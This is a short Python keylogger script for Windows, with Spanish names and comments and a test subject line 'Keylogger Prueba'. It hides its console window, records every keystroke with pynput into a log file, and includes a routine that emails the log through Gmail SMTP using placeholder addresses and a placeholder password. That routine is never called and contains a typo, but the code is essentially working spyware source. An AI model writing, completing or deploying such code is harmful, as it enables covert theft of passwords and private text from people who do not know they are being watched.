#!/usr/bin/env python
# -*- coding: utf-8 -*-

import pynput.keyboard
import smtplib
import time 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import win32console
import win32gui

ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana,0)

lista_tecla = []
log_file = open('log.txt','w+')

def enviar_datos():
    msg = MIMEMultipart()
    password = "My_password"
    msg['From'] = "example@example.com"
    msg['To'] = "example@example.com"
    msg['Subject'] = "Keylogger Prueba"
    msg.attach(MIMEText(open('log.txt').red()))

    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(msg['From'],password)
        server.sendmail(msg['From'],msg['To'],msg.as_string())
        server.quit()
    except:
        pass

def imprimir():
    teclas = ''.join(lista_tecla)
    log_file.write(teclas)
    log_file.write('\n')
    log_file.close()

def convertir(key):
    try:
        return key.char
    except AttributeError:
        return str(key)

def presiona(key):
    key_str = convertir(key)
    
    if key_str == "Key.esc":
        print("Saliendo...")
        imprimir()
        return False 
    elif key_str == "Key.space":
        lista_tecla.append(' ')
    elif key_str == "Key.enter":
        lista_tecla.append('\n')
    elif key_str == 'Key.backspace':
        pass
    elif key_str == 'Key.tab':
        pass
    elif key_str == 'Key.shift':
        pass
    else:
        lista_tecla.append(key_str)

def main():
    with pynput.keyboard.Listener(on_press=presiona) as listener:
        listener.join()

if __name__ == "__main__":
    main()
